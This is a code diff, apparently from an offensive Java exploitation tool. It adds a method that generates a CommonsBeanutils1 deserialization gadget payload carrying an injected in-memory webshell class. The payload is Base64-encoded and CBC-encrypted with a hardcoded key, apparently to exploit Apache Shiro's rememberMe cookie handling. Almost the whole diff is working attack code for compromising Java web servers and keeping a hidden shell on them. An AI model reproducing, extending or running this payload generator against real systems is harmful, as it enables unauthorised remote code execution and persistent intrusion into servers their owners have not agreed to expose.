@@ -115,6 +115,29 @@ public class CommonsBeanutils1 {
         return null;
     }
 
+    public static String genMemPayload() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass;
+        CtClass superClass;
+
+        MemInject memInject = new MemInject();
+        ctClass = memInject.genPayload(pool);
+
+        // 判断是否存在properXalan属性，然后选择AbstractTranslet
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+        } else {
+            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+        }
+        ctClass.setSuperclass(superClass);            // 设置父类
+
+        // 生成反序列化payload
+        byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
+        String data = Base64.getEncoder().encodeToString(payload);
+        String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+        return result;
+    }
+
     public static void main(String[] args) throws Exception {
         ClassPool pool = ClassPool.getDefault();    // 设置pool用以获取类
         CtClass clazz;                              // 设置clazz接收回显字节码
